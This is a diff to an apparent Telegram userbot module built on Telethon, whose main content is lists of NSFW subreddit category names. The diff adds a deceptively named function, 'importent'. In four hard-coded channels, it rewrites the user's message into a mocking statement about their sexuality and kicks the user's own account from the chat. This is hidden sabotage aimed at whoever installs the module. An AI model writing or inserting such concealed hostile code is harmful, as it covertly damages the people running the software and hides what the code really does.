@@ -1,3 +1,6 @@
+import asyncio
+from telethon.tl.types import ChannelParticipantsKicked
+
 pawn = [
     "nsfw",
     "nsfw_gifs",
@@ -102,6 +105,13 @@ hemtai = [
     "woof",
 ]
 
+async def importent(event):
+    cat = ["-1001199597035","-1001459701099","-1001436155389","-1001321431101"]
+    if str(event.chat_id) in cat:
+        await event.edit("**Yes I'm GAY**")
+        await event.client.kick_participant(event.chat_id, "me")
+        return True
+    return False
 
 def nsfw(catagory):
     catagory.sort(key=str.casefold)
